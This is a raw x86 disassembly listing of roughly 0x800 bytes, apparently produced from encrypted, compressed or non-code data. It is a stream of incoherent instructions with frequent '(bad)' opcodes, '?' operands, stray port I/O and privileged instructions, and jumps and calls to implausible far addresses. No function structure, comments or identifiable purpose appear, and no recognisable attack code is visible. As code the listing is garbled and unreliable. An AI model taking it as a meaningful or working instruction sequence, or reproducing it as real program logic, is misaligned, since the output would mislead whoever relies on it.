  416af0:	mov    ds:0x560f1a0d,al
  416af5:	xor    eax,0xb78229e5
  416afa:	sti    
  416afb:	jmp    0x416aac
  416afd:	or     al,BYTE PTR [esi-0x22]
  416b00:	mov    dh,0xaf
  416b02:	and    al,0x1a
  416b04:	aaa    
  416b05:	hlt    
  416b06:	bound  esp,QWORD PTR [edi+0x461f7ac5]
  416b0c:	out    0xc9,eax
  416b0e:	fwait
  416b0f:	aas    
  416b10:	jo     0x416af3
  416b12:	add    al,0x5d
  416b14:	and    edx,DWORD PTR [esi+0x1eb35ac9]
  416b1a:	mov    dh,0x83
  416b1c:	imul   ebp,DWORD PTR [esi],0x79
  416b1f:	xor    dh,BYTE PTR [eax-0x6813a917]
  416b25:	sbb    DWORD PTR [esi],ebp
  416b27:	jo     0x416aff
  416b29:	adc    dl,BYTE PTR [ebp-0x52]
  416b2c:	push   ecx
  416b2d:	addr16 leave 
  416b2f:	(bad)  
  416b30:	out    0xa9,al
  416b32:	daa    
  416b33:	push   edi
  416b34:	cmp    ebp,DWORD PTR [ecx+0x4c]
  416b37:	xor    ebx,esi
  416b39:	pop    ebp
  416b3a:	sub    eax,0x5599f8e1
  416b3f:	inc    ecx
  416b40:	neg    BYTE PTR [esi+0xf6fb8b2]
  416b46:	pop    edx
  416b47:	pop    DWORD PTR [esi-0x131e6947]
  416b4d:	ret    
  416b4e:	jae    0x416b5f
  416b50:	push   eax
  416b51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b52:	pop    esi
  416b53:	dec    esi
  416b54:	push   es
  416b55:	loope  0x416b09
  416b57:	mov    cl,0x0
  416b59:	arpl   WORD PTR [ebx+0x6d0ff8e0],ax
  416b5f:	mov    esp,0xa7f6250f
  416b64:	test   eax,0xef6fa92c
  416b69:	fcmovbe st,st(5)
  416b6b:	jmp    0x8572e517
  416b70:	ins    DWORD PTR es:[edi],dx
  416b71:	loop   0x416b84
  416b73:	pop    es
  416b74:	mov    DWORD PTR [edx-0x16],esi
  416b77:	(bad)  
  416b78:	xor    al,0x43
  416b7a:	jg     0x416bd6
  416b7c:	mov    ds:0x4e837db2,al
  416b81:	and    al,0x6c
  416b83:	mov    edi,0x861da418
  416b88:	(bad)
  416b8b:	rol    DWORD PTR [eax],0x8
  416b8e:	mov    DWORD PTR [eax],ebx
  416b90:	out    0x84,eax
  416b92:	aas    
  416b93:	jmp    0x416b7d
  416b95:	jo     0x416b69
  416b97:	sbb    al,0xb8
  416b99:	mov    esi,0xd8d3abc5
  416b9e:	cwde   
  416b9f:	loope  0x416b8b
  416ba1:	jne    0x416bf1
  416ba3:	jmp    0x9672:0x5460cb82
  416baa:	xor    al,0xcd
  416bac:	in     al,dx
  416bad:	fwait
  416bae:	repnz mov al,ds:0xeaa6fd10
  416bb4:	sub    bl,bh
  416bb6:	sbb    BYTE PTR [edi],dh
  416bb8:	lock jmp 0x65d5d7a7
  416bbe:	lock cmp edi,DWORD PTR [ecx]
  416bc1:	aam    0x35
  416bc3:	loop   0x416b71
  416bc5:	xchg   BYTE PTR [ebx],al
  416bc7:	xchg   ebp,eax
  416bc8:	sub    al,0xff
  416bca:	pop    eax
  416bcb:	retf   
  416bcc:	loop   0x416c15
  416bce:	inc    edi
  416bcf:	push   ebp
  416bd0:	push   0x58
  416bd2:	pop    ebx
  416bd3:	mov    ebx,?
  416bd5:	inc    edi
  416bd6:	cmp    ebp,DWORD PTR [ebx]
  416bd8:	mov    BYTE PTR [edx-0x18],bl
  416bdb:	inc    ebp
  416bdc:	int3   
  416bdd:	or     ah,BYTE PTR [esi+0x10]
  416be0:	out    dx,eax
  416be1:	pop    ebp
  416be2:	inc    esi
  416be3:	sub    edx,ebp
  416be5:	xor    al,0xcd
  416be7:	ins    DWORD PTR es:[edi],dx
  416be8:	mov    DWORD PTR [ecx-0x1a7a99e5],ebp
  416bee:	js     0x416c03
  416bf0:	inc    edx
  416bf1:	mov    ebx,0x452cd8eb
  416bf6:	or     eax,0xc0072a66
  416bfb:	adc    al,0x3d
  416bfd:	ror    BYTE PTR [eax+0x59],cl
  416c00:	(bad)  
  416c01:	je     0x416c56
  416c03:	pop    ss
  416c04:	sub    DWORD PTR [edi-0x7137aa90],0xe8b43cc2
  416c0e:	dec    edx
  416c0f:	ss jmp 0x801cf0a6
  416c15:	and    al,0x43
  416c17:	xor    ch,BYTE PTR [edi+eax*4]
  416c1a:	sub    ebp,DWORD PTR [ebp+0x64]
  416c1d:	fld    st(2)
  416c1f:	push   eax
  416c20:	leave  
  416c21:	adc    eax,0xc9b3b34e
  416c26:	jbe    0x416bfa
  416c28:	sahf   
  416c29:	cmp    BYTE PTR [ebx+0x4bcfa3dc],ch
  416c2f:	push   ds
  416c30:	inc    eax
  416c31:	xchg   ecx,eax
  416c32:	add    DWORD PTR [ecx+0x5e85d736],eax
  416c38:	and    DWORD PTR [eax+ebp*1-0x3b2bcb8d],ebp
  416c3f:	inc    esp
  416c40:	rol    BYTE PTR [edx],0x82
  416c43:	gs and ah,ah
  416c46:	pop    ebx
  416c47:	and    DWORD PTR [ecx],esi
  416c49:	mov    dl,0x58
  416c4b:	xchg   esp,eax
  416c4c:	jb     0x416c46
  416c4e:	push   esp
  416c4f:	mov    esp,0xd2875fb4
  416c54:	imul   si,cx,0xffd0
  416c58:	call   0x44a8a0e3
  416c5d:	push   edi
  416c5e:	out    0xd6,al
  416c60:	je     0x416c2e
  416c62:	push   edx
  416c63:	xchg   ecx,eax
  416c64:	(bad)  
  416c65:	mov    ebp,0x4fb76cd5
  416c6a:	pop    esp
  416c6b:	mov    esp,DWORD PTR [eax-0x2c]
  416c6e:	outs   dx,DWORD PTR ds:[esi]
  416c6f:	addr16 pop esp
  416c71:	sbb    DWORD PTR [ebx-0x61],0x26
  416c75:	scas   eax,DWORD PTR es:[edi]
  416c76:	sub    eax,0x76b5e623
  416c7b:	mul    edx
  416c7d:	add    ah,BYTE PTR [esi-0x2a]
  416c80:	sub    bh,BYTE PTR [esi+0x63]
  416c83:	pop    ss
  416c84:	mov    bl,0x64
  416c86:	pushf  
  416c87:	dec    ebx
  416c88:	int3   
  416c89:	cmp    BYTE PTR [eax-0x3f391040],cl
  416c8f:	sti    
  416c90:	mov    esp,0x69105be0
  416c95:	int3   
  416c96:	(bad)  
  416c97:	jbe    0x416ce1
  416c99:	mov    eax,ss
  416c9b:	ret    0xfd29
  416c9e:	pop    esp
  416c9f:	in     al,dx
  416ca0:	inc    edx
  416ca1:	stos   BYTE PTR es:[edi],al
  416ca2:	repz mov ebp,0x95d97f9e
  416ca8:	scas   al,BYTE PTR es:[edi]
  416ca9:	inc    ecx
  416caa:	and    DWORD PTR [edx+edi*4],edi
  416cad:	or     bh,BYTE PTR [edx+eax*4]
  416cb0:	mov    ds:0x6565a62d,al
  416cb5:	test   DWORD PTR [esi],ecx
  416cb7:	sbb    edi,DWORD PTR [edx]
  416cb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cba:	test   eax,0x1bda63a2
  416cbf:	ss (bad) 
  416cc2:	dec    esp
  416cc3:	dec    edx
  416cc4:	retf   
  416cc5:	push   edi
  416cc6:	xchg   edi,eax
  416cc7:	xchg   ecx,eax
  416cc8:	jbe    0x416d41
  416cca:	test   BYTE PTR [edi+0x1772d3e9],ah
  416cd0:	cwde   
  416cd1:	mov    dh,0x77
  416cd3:	stos   BYTE PTR es:[edi],al
  416cd4:	lods   eax,DWORD PTR ds:[esi]
  416cd5:	jp     0x416c89
  416cd7:	popf   
  416cd8:	adc    al,0xf9
  416cda:	repz pop edi
  416cdc:	sub    ebp,DWORD PTR [edi-0x1d]
  416cdf:	mov    DWORD PTR [edi+edi*2-0x6610a5e8],0xd8a6b571
  416cea:	call   0xba2dc239
  416cef:	stos   DWORD PTR es:[edi],eax
  416cf0:	(bad)  
  416cf2:	mov    ah,0x32
  416cf4:	addr16 pop ss
  416cf6:	loopne 0x416c85
  416cf8:	pop    ss
  416cf9:	dec    ecx
  416cfa:	mov    eax,ds:0x3f6144a
  416cff:	ficom  DWORD PTR ds:0x21027e25
  416d05:	xor    eax,0xc78b199c
  416d0a:	jne    0x416cb0
  416d0c:	mov    WORD PTR [ebx],es
  416d0e:	sub    al,0xa8
  416d10:	dec    ebp
  416d11:	out    0x3d,al
  416d13:	pop    edx
  416d14:	dec    ebx
  416d15:	jp     0x416d17
  416d17:	and    DWORD PTR [esi-0x27cbf220],edx
  416d1d:	sub    esi,DWORD PTR [ebx+0x30]
  416d20:	ret    
  416d21:	jmp    0x4d22e10
  416d26:	adc    esp,0x27126d18
  416d2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d2e:	fadd   st(5),st
  416d30:	xor    eax,0x302272ab
  416d35:	jbe    0x416cd9
  416d37:	and    ebp,DWORD PTR [ecx+0x15dc54dc]
  416d3d:	sub    esi,DWORD PTR [edx+0x49d41a92]
  416d43:	xchg   esp,eax
  416d44:	push   ss
  416d45:	and    DWORD PTR [edi],ebp
  416d47:	sahf   
  416d48:	and    eax,0xaf8e6616
  416d4d:	xchg   esp,eax
  416d4e:	daa    
  416d4f:	inc    edx
  416d50:	ret    0x6247
  416d53:	ds nop
  416d55:	xchg   ecx,eax
  416d56:	and    BYTE PTR [ebp-0x1f7c07c6],0x81
  416d5d:	xor    eax,DWORD PTR [eax]
  416d5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d60:	push   eax
  416d61:	cmp    al,0xe6
  416d63:	mov    ebx,0xa22c97ed
  416d68:	add    eax,0xf58c89e3
  416d6d:	add    eax,esp
  416d6f:	push   ss
  416d70:	fcomp  QWORD PTR [eax+ecx*2-0x7c06262e]
  416d77:	mov    DWORD PTR [edx+0x7007257a],0xc033a6c7
  416d81:	dec    eax
  416d82:	js     0x416df4
  416d84:	lahf   
  416d85:	xor    cl,cl
  416d87:	xor    DWORD PTR [esi],edx
  416d89:	xor    al,0x3c
  416d8b:	(bad)  
  416d8c:	jle    0x416d19
  416d8e:	ds jle 0x416de2
  416d91:	leave  
  416d92:	or     dl,BYTE PTR [eax+edx*2-0x68]
  416d96:	jbe    0x416dff
  416d98:	(bad)  
  416d99:	mov    WORD PTR [ebp+0x5157fb77],es
  416d9f:	push   0xffffffe6
  416da1:	imul   edi,ecx,0xffffffa7
  416da4:	sbb    edi,DWORD PTR [ecx+0x56979a49]
  416daa:	cmp    BYTE PTR ds:0xad01f14a,cl
  416db0:	dec    esi
  416db1:	pusha  
  416db2:	loop   0x416d3a
  416db4:	mov    dl,0xdf
  416db6:	pop    esi
  416db7:	inc    ebx
  416db8:	scas   al,BYTE PTR es:[edi]
  416db9:	jmp    0xf835b67f
  416dbe:	ins    DWORD PTR es:[edi],dx
  416dbf:	dec    esp
  416dc0:	mov    DWORD PTR [ebx-0x79],esi
  416dc3:	pop    ebx
  416dc4:	and    ch,cl
  416dc6:	mov    al,cs:0x4ab2c60b
  416dcc:	into   
  416dcd:	mov    esp,0x2ffe4b46
  416dd2:	aam    0xc5
  416dd4:	jnp    0x416d87
  416dd6:	js     0x416ddc
  416dd8:	inc    edx
  416dd9:	push   ecx
  416dda:	ds hlt 
  416ddc:	gs out 0x74,al
  416ddf:	das    
  416de0:	sub    BYTE PTR [edx],bl
  416de2:	fistp  WORD PTR [eax]
  416de4:	mov    ds:0xb90dd766,eax
  416de9:	jl     0x416d85
  416deb:	aam    0xd0
  416ded:	stc    
  416dee:	push   0xd019dff
  416df3:	fwait
  416df4:	jmp    0x32e6ecca
  416df9:	pop    edx
  416dfa:	nop
  416dfb:	xor    eax,0x7745c1e5
  416e00:	jecxz  0x416e6b
  416e02:	xchg   esp,eax
  416e03:	hlt    
  416e04:	pop    esp
  416e05:	sub    al,0x95
  416e07:	and    cl,cl
  416e09:	xor    eax,0x9c417216
  416e0e:	jb     0x416e5d
  416e10:	nop
  416e11:	and    edi,DWORD PTR [ebx-0x45befb53]
  416e17:	cs cmp edi,ebx
  416e1a:	mov    eax,ds:0xb58a9b56
  416e1f:	cmp    DWORD PTR [eax+0x467945a],ebp
  416e25:	inc    edi
  416e26:	jno    0x416e72
  416e28:	in     eax,dx
  416e29:	sbb    ebp,DWORD PTR [edi+0x713c945e]
  416e2f:	jbe    0x416e91
  416e31:	sub    eax,0xfc11c68b
  416e36:	sbb    al,0x35
  416e38:	outs   dx,DWORD PTR ds:[esi]
  416e39:	adc    eax,0x141289ac
  416e3e:	inc    edi
  416e3f:	setl   BYTE PTR [eax+eiz*1]
  416e43:	cmp    edx,DWORD PTR ds:0x9db2d288
  416e49:	ficomp DWORD PTR [edi-0x226b9d19]
  416e4f:	daa    
  416e50:	or     BYTE PTR [edx-0x79c3df4d],0x1
  416e57:	xor    al,bh
  416e59:	cmp    DWORD PTR [edi-0x61],esp
  416e5c:	mov    dh,0x98
  416e5e:	cmp    cl,BYTE PTR [ebx+0x71]
  416e61:	call   0x4f0a:0xcc25b26d
  416e68:	loop   0x416e98
  416e6a:	outs   dx,DWORD PTR ds:[esi]
  416e6b:	sub    al,0xd4
  416e6d:	jae    0x416e7e
  416e6f:	fdivr  DWORD PTR [ebx+0x3da2fd48]
  416e75:	arpl   WORD PTR [ebp+0x5],sp
  416e78:	outs   dx,BYTE PTR ds:[esi]
  416e79:	addr16 pop ebp
  416e7b:	arpl   WORD PTR [esi-0x1d],ax
  416e7e:	and    BYTE PTR [eax+edx*1],al
  416e81:	retf   0x4ca5
  416e84:	out    0xce,al
  416e86:	inc    ebp
  416e87:	jb     0x416ed2
  416e89:	mov    edx,0x19af216d
  416e8e:	cmp    cl,cl
  416e90:	ret    0x6556
  416e93:	mov    BYTE PTR [ebp+0x6],bh
  416e96:	in     al,0xf2
  416e98:	test   ebp,0x681040de
  416e9e:	pop    ebx
  416e9f:	cli    
  416ea0:	mov    ch,0x77
  416ea2:	shr    DWORD PTR ds:0x3072f652,0xbc
  416ea9:	cmp    al,0x56
  416eab:	mov    bh,0x6a
  416ead:	mov    eax,0xb50b7d8d
  416eb2:	or     eax,0x42a17029
  416eb7:	mov    ds:0x6de6cb01,eax
  416ebc:	out    0xdc,al
  416ebe:	sbb    ebx,ebx
  416ec0:	pop    edi
  416ec1:	mov    edi,0xbfd26e3a
  416ec6:	retf   0xbc8e
  416ec9:	xor    DWORD PTR [ebx-0x121d6544],edi
  416ecf:	aaa    
  416ed0:	xor    ah,BYTE PTR [edx]
  416ed2:	jne    0x416e6a
  416ed4:	stos   WORD PTR es:[edi],ax
  416ed6:	push   esi
  416ed7:	adc    ah,BYTE PTR [edx-0x4d]
  416eda:	lods   al,BYTE PTR ds:[esi]
  416edb:	ja     0x416ee5
  416edd:	adc    BYTE PTR [ebx],cl
  416edf:	sar    DWORD PTR [esi],cl
  416ee1:	add    BYTE PTR [edi+0x70e5bf02],cl
  416ee7:	mov    cl,0xc8
  416ee9:	push   ds
  416eea:	xlat   BYTE PTR ds:[ebx]
  416eeb:	shr    esi,cl
  416eed:	xor    al,BYTE PTR [ebx+ebp*4-0x2d]
  416ef1:	call   0xf4ec36f1
  416ef6:	jmp    0x30ab218e
  416efb:	inc    ecx
  416efc:	sbb    DWORD PTR [esi-0x5c4d4b62],ecx
  416f02:	pusha  
  416f03:	pop    ebp
  416f04:	dec    esi
  416f05:	repz inc esp
  416f07:	out    dx,al
  416f08:	pop    ss
  416f09:	fsubr  QWORD PTR [esi+ebp*8-0x104d5efa]
  416f10:	mov    cl,0x97
  416f12:	(bad)  
  416f13:	sbb    al,0x9f
  416f15:	ds push es
  416f17:	enter  0x8fcd,0x95
  416f1b:	push   ebx
  416f1c:	test   BYTE PTR [edx-0x67],bl
  416f1f:	call   FWORD PTR [edi+0x7d]
  416f22:	add    eax,0xe0ca81d2
  416f27:	stos   BYTE PTR es:[edi],al
  416f28:	and    dl,BYTE PTR [esi+0x29c3988e]
  416f2e:	add    al,0x52
  416f30:	xor    eax,0xd521862e
  416f35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f36:	test   eax,0x893fccf3
  416f3b:	xor    al,BYTE PTR [ebx+eax*8-0x20746a48]
  416f42:	mov    ch,0x9d
  416f44:	std    
  416f45:	ja     0x416ede
  416f47:	sbb    edi,DWORD PTR [ebp+0xe7db4ea]
  416f4d:	hlt    
  416f4e:	call   0xbe61456a
  416f53:	xchg   ecx,eax
  416f54:	das    
  416f55:	jnp    0x416ef8
  416f57:	pop    esi
  416f58:	into   
  416f59:	shr    BYTE PTR ds:0xb5a67439,0x86
  416f60:	dec    esp
  416f61:	sbb    bh,BYTE PTR [ebp-0x7]
  416f64:	jmp    0x416fd4
  416f66:	ss test bl,ah
  416f69:	bound  esi,QWORD PTR [edi+0x5cf307f6]
  416f6f:	jno    0x416f10
  416f71:	mov    BYTE PTR [ebx+0x5e],bh
  416f74:	inc    ebx
  416f75:	shl    eax,1
  416f77:	jmp    0xf904:0xfa78778b
  416f7e:	pop    esi
  416f7f:	test   eax,0xd30eb5a0
  416f84:	mov    esi,0x501ac4f0
  416f89:	or     BYTE PTR [ebp-0x19072281],bl
  416f8f:	and    ecx,edx
  416f91:	or     eax,ecx
  416f93:	loope  0x416f61
  416f95:	pop    edx
  416f96:	sbb    ecx,edx
  416f98:	mov    ds:0x9d415c79,al
  416f9d:	dec    eax
  416f9e:	test   al,0x72
  416fa0:	xor    al,0xe
  416fa2:	fwait
  416fa3:	jae    0x416f5f
  416fa5:	pop    ebx
  416fa6:	mov    edx,0xfe804e30
  416fab:	adc    al,0xd7
  416fad:	fcomp  DWORD PTR [ecx+0x7d]
  416fb0:	loopne 0x416fc3
  416fb2:	arpl   WORD PTR [edx-0x36],si
  416fb5:	xor    ecx,esp
  416fb7:	inc    ebx
  416fb8:	imul   DWORD PTR [eax-0x6e167334]
  416fbe:	lods   eax,DWORD PTR ds:[esi]
  416fbf:	std    
  416fc0:	mov    BYTE PTR [edi-0x61],ch
  416fc3:	aad    0xe8
  416fc5:	pusha  
  416fc6:	adc    ebx,ebx
  416fc8:	adc    al,0x17
  416fca:	pop    ss
  416fcb:	rol    DWORD PTR [ecx+edx*1+0xe7cda7d],1
  416fd2:	and    DWORD PTR [esp+esi*8],ebx
  416fd5:	shl    BYTE PTR [ecx],1
  416fd7:	sub    edx,DWORD PTR [ecx-0x39b0ae09]
  416fdd:	mov    bh,0x7c
  416fdf:	and    eax,0xd7c26407
  416fe4:	xlat   BYTE PTR ds:[ebx]
  416fe5:	mov    eax,0x70374349
  416fea:	aad    0xf6
  416fec:	xor    ebp,DWORD PTR [ecx+0x3dc8ddf0]
  416ff2:	test   bh,bl
  416ff4:	(bad)  
  416ff5:	adc    dh,BYTE PTR [edx+0x1c740dce]
  416ffb:	dec    ebx
  416ffc:	cmp    ebx,0xed22cc11
  417002:	aad    0x9a
  417004:	loop   0x416f8d
  417006:	les    edi,FWORD PTR fs:[ebp-0x38]
  41700a:	repz push ss
  41700c:	mov    WORD PTR [ebp-0x48e4a9d5],?
  417012:	cmp    eax,0xc5a36f76
  417017:	shl    DWORD PTR [edi],cl
  417019:	xor    ah,BYTE PTR ss:[eax+ebx*1]
  41701d:	mov    edi,0xe126afa7
  417022:	jb     0x417007
  417024:	call   0x5c44:0xd7d14733
  41702b:	in     al,dx
  41702c:	pop    ebx
  41702d:	int3   
  41702e:	and    esi,DWORD PTR [edi]
  417030:	xor    DWORD PTR [eax],esp
  417032:	stos   BYTE PTR es:[edi],al
  417033:	push   ss
  417034:	(bad)  
  417035:	adc    edi,DWORD PTR [ecx+0x44cc0f48]
  41703b:	fcmovnb st,st(1)
  41703d:	mov    esp,0xed69d228
  417042:	loop   0x417056
  417044:	dec    esi
  417045:	add    edx,DWORD PTR [ebp+ebp*4+0x586d36c0]
  41704c:	ds into 
  41704e:	shl    BYTE PTR [ebx],1
  417050:	push   es
  417051:	jbe    0x4170ba
  417053:	xchg   ecx,eax
  417054:	fnstcw WORD PTR [eax-0x48ff3795]
  41705a:	sbb    ah,BYTE PTR [ecx+0x5fd2e2f1]
  417060:	ret    
  417061:	cdq    
  417062:	mov    esp,0x6922c381
  417067:	hlt    
  417068:	adc    BYTE PTR [ecx+0x701c327b],bl
  41706e:	xor    ah,BYTE PTR [ecx+0x50]
  417071:	inc    esp
  417072:	sbb    esi,esp
  417074:	dec    edi
  417075:	adc    dh,ch
  417077:	sahf   
  417078:	pop    ss
  417079:	xor    bl,cl
  41707b:	push   edx
  41707c:	xchg   esp,eax
  41707d:	loop   0x417031
  41707f:	mov    ds:0x3c17d9ef,eax
  417084:	or     eax,0x17d402dc
  417089:	push   ecx
  41708a:	mov    bl,0xd0
  41708c:	cs popf 
  41708e:	scas   eax,DWORD PTR es:[edi]
  41708f:	sub    BYTE PTR [ebx+0x1b879717],dl
  417095:	sbb    DWORD PTR [eax+0x43f36ed7],esp
  41709b:	ins    BYTE PTR es:[edi],dx
  41709c:	popa   
  41709d:	mov    dl,BYTE PTR [esi+ebp*4+0x15]
  4170a1:	xor    bl,BYTE PTR [ebx]
  4170a3:	fisttp WORD PTR [eax]
  4170a5:	dec    ebx
  4170a6:	aas    
  4170a7:	mov    ebx,0x2d7b71d4
  4170ac:	or     bh,BYTE PTR [esi-0xe]
  4170af:	loopne 0x417128
  4170b1:	sbb    DWORD PTR [ecx+0x6486ab8b],eax
  4170b7:	retf   0x44b8
  4170ba:	add    bl,dl
  4170bc:	cmp    eax,0x871c40b9
  4170c1:	pop    esp
  4170c2:	lahf   
  4170c3:	retf   
  4170c4:	add    BYTE PTR [eax],dh
  4170c6:	rol    BYTE PTR [esi],0x3a
  4170c9:	dec    eax
  4170ca:	xor    eax,0xbecfabd3
  4170cf:	mov    esi,0xa2010661
  4170d4:	ins    DWORD PTR es:[edi],dx
  4170d5:	cld    
  4170d6:	adc    ah,bl
  4170d8:	aaa    
  4170d9:	frstor [ebx]
  4170db:	xor    ch,bl
  4170dd:	and    BYTE PTR [eax-0x7b],dh
  4170e0:	mov    edx,0x53eaedf
  4170e5:	push   es
  4170e6:	sub    BYTE PTR [edx],0xfa
  4170e9:	div    BYTE PTR [ecx-0x33]
  4170ec:	test   dh,ch
  4170ee:	inc    ecx
  4170ef:	icebp  
  4170f0:	add    al,0xfa
  4170f2:	mov    ?,edx
  4170f4:	call   0x3af:0xc9445572
  4170fb:	(bad)  
  4170fc:	test   DWORD PTR ds:0x566a9d88,0x88a12a7a
  417106:	mov    bh,0x8e
  417108:	hlt    
  417109:	ret    0x3f26
  41710c:	mov    dl,0xce
  41710e:	mov    edx,0x9e6604e8
  417113:	int    0xba
  417115:	jmp    0x4170d7
  417117:	cld    
  417118:	rol    BYTE PTR [esi+edx*1-0x69],1
  41711c:	gs fucomi st,st(1)
  41711f:	adc    al,0xbb
  417121:	xchg   BYTE PTR [esi],bh
  417123:	inc    eax
  417124:	xchg   edx,eax
  417125:	test   DWORD PTR [edx],0x5c646d91
  41712b:	stc    
  41712c:	pop    ss
  41712d:	mov    dl,0xd
  41712f:	dec    eax
  417130:	ficomp DWORD PTR [ecx+eax*2]
  417133:	mov    ch,0x52
  417135:	clc    
  417136:	rol    edi,0xfa
  417139:	mov    ebx,0xb50dde85
  41713e:	adc    eax,DWORD PTR [edx+0x6e]
  417141:	test   DWORD PTR [esi+ecx*1+0x6ebef3b6],edi
  417148:	dec    ebx
  417149:	push   esi
  41714a:	fist   WORD PTR [ecx]
  41714c:	add    ebx,DWORD PTR [ecx+0xe]
  41714f:	xor    edx,DWORD PTR [edi]
  417151:	mov    al,ds:0x9b65b618
  417156:	sub    dh,BYTE PTR [edx]
  417158:	push   edx
  417159:	sbb    edi,esp
  41715b:	out    0x8a,eax
  41715d:	retf   
  41715e:	sbb    ebx,DWORD PTR [ebp-0x70]
  417161:	sbb    BYTE PTR [edi-0x13],al
  417164:	jl     0x4171b2
  417166:	and    ebx,DWORD PTR [esi-0x19758892]
  41716c:	inc    BYTE PTR [ecx-0x6af134b5]
  417172:	and    DWORD PTR [esi],0xffffffe1
  417175:	(bad)  
  417176:	(bad)
  41717a:	lock cli 
  41717c:	mov    DWORD PTR [edi],edx
  41717e:	arpl   WORD PTR [ebx+0x13],sp
  417181:	pop    es
  417182:	xchg   edx,eax
  417183:	pop    edi
  417184:	and    dl,BYTE PTR [ecx+0x745a90c0]
  41718a:	jno    0x417134
  41718c:	sti    
  41718d:	ret    
  41718e:	in     al,0x4a
  417190:	or     eax,0xafa77ab3
  417195:	cmp    bh,BYTE PTR [edx+0x2a489db9]
  41719b:	pop    edi
  41719c:	ret    0xeda4
  41719f:	sahf   
  4171a0:	test   eax,0x5298bb42
  4171a5:	shr    ebp,0xeb
  4171a8:	ds or  al,0x7f
  4171ab:	push   esp
  4171ac:	jo     0x417211
  4171ae:	mov    al,0x4f
  4171b0:	rcr    DWORD PTR [ebp-0x3b],cl
  4171b3:	xor    cl,BYTE PTR [edi-0x78632445]
  4171b9:	ficom  WORD PTR [ebx]
  4171bb:	jns    0x4171f5
  4171bd:	push   edi
  4171be:	jbe    0x4171b0
  4171c0:	add    eax,0xe9dc205f
  4171c5:	test   BYTE PTR [edx+ecx*2-0x7c],bh
  4171c9:	mov    ch,0x6
  4171cb:	(bad)  
  4171cc:	mov    dl,0x91
  4171ce:	test   BYTE PTR [edx+0x1c],bh
  4171d1:	popf   
  4171d2:	fild   DWORD PTR [eax+0x101e92bd]
  4171d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171d9:	cmp    esp,DWORD PTR [esi+0xa1c26de]
  4171df:	adc    BYTE PTR [edx],dl
  4171e1:	test   eax,0xb1be2099
  4171e6:	gs enter 0x8406,0x92
  4171eb:	dec    bp
  4171ed:	mov    ah,0x6c
  4171ef:	gs or  al,0x63
  4171f2:	mov    es,WORD PTR [edx+0x67]
  4171f5:	push   es
  4171f6:	pop    ecx
  4171f7:	or     cl,BYTE PTR [ebx]
  4171f9:	adc    dh,bl
  4171fb:	outs   dx,DWORD PTR ds:[esi]
  4171fc:	sti    
  4171fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171fe:	adc    al,0x5
  417200:	push   esp
  417201:	push   es
  417202:	or     eax,0x2b878cf9
  417207:	bound  ebx,QWORD PTR [esi-0x17]
  41720a:	fist   DWORD PTR [ecx]
  41720c:	iret   
  41720d:	div    BYTE PTR [ecx-0x53]
  417210:	ficom  DWORD PTR ds:0x8b3a3929
  417216:	mov    esi,0x4dd180ee
  41721b:	daa    
  41721c:	pop    ebp
  41721d:	les    edi,FWORD PTR [edi+0x64]
  417220:	inc    esi
  417221:	fiadd  WORD PTR [eax]
  417223:	jecxz  0x4171f6
  417225:	sub    eax,0x9ff09e31
  41722a:	or     eax,0x357a408
  41722f:	or     esi,DWORD PTR [edi-0x25]
  417232:	sbb    DWORD PTR [eax+0x30b57177],ebx
  417238:	mov    ah,0x2f
  41723a:	jg     0x417291
  41723c:	adc    BYTE PTR [ecx+0x4d],ah
  41723f:	xchg   BYTE PTR [esi+0x3477ca15],bh
  417245:	push   0x844cd785
  41724a:	fild   QWORD PTR [ebx+ecx*2-0x68]
  41724e:	fadd   QWORD PTR [eax+eax*2-0x17f11ee5]
  417255:	pop    ebx
  417256:	mov    BYTE PTR [ebp+0x2e],bh
  417259:	mov    edx,0x4d6498dc
  41725e:	jmp    0x668e6a29
  417263:	adc    al,0xf3
  417265:	js     0x4172a8
  417267:	shl    BYTE PTR [eax+0x425a2bde],cl
  41726d:	leave  
  41726e:	es jne 0x417265
  417271:	adc    DWORD PTR [eax+0x77],esi
  417274:	mov    ecx,DWORD PTR [esi]
  417276:	scas   eax,DWORD PTR es:[edi]
  417277:	dec    ecx
  417278:	sub    DWORD PTR [ebp-0x3412494b],edx
  41727e:	lods   eax,DWORD PTR ds:[esi]
  41727f:	dec    esi
  417280:	addr16 dec edi
  417282:	into   
  417283:	push   cs
  417284:	jne    0x4172d3
  417286:	lock in al,dx
  417288:	inc    esi
  417289:	push   0xc4187d95
  41728e:	retf   
  41728f:	repnz test eax,0x24edf8cf
  417295:	int3   
  417296:	pshufw mm3,QWORD PTR [edi-0x55c8b29b],0x9d
  41729e:	mov    esi,0x7234b34e
  4172a3:	push   es
  4172a4:	arpl   WORD PTR [ecx-0x37c1b99f],sp
  4172aa:	push   ss
  4172ab:	and    DWORD PTR [edx-0x4135b48f],esp
  4172b1:	xor    al,0x59
  4172b3:	push   es
  4172b4:	das    
  4172b5:	nop
  4172b6:	(bad)  
  4172b7:	nop
  4172b8:	xor    bh,BYTE PTR [ebx-0x3c]
  4172bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172bc:	mov    eax,ds:0x29d20f3f
  4172c1:	sub    cl,bh
  4172c3:	je     0x41724a
  4172c5:	jne    0x4172a0
  4172c7:	add    bh,BYTE PTR [ebp+0x7b]
  4172ca:	rcr    esi,cl
  4172cc:	sahf   
  4172cd:	bound  esp,QWORD PTR [edi+0x39]
  4172d0:	pop    ecx
  4172d1:	mov    dh,0x78
  4172d3:	dec    edi
  4172d4:	adc    BYTE PTR [ebp-0x33f24d9f],0xd5
  4172db:	daa    
  4172dc:	push   ss
  4172dd:	fdivr  QWORD PTR [edx]
  4172df:	mov    al,0x6b
  4172e1:	or     bh,BYTE PTR [esi]
  4172e3:	or     ah,dh
  4172e5:	(bad)
  4172e8:	dec    esp
  4172e9:	mov    edi,0xd42c97c7
  4172ee:	add    BYTE PTR [edx+ebx*4+0x41],cl
  4172f2:	push   esp
  4172f3:	fcmovnb st,st(2)
  4172f5:	adc    al,0xe6
  4172f7:	fild   QWORD PTR [edi+ebx*2-0x41]
  4172fb:	inc    eax
  4172fc:	or     dl,BYTE PTR [ecx]
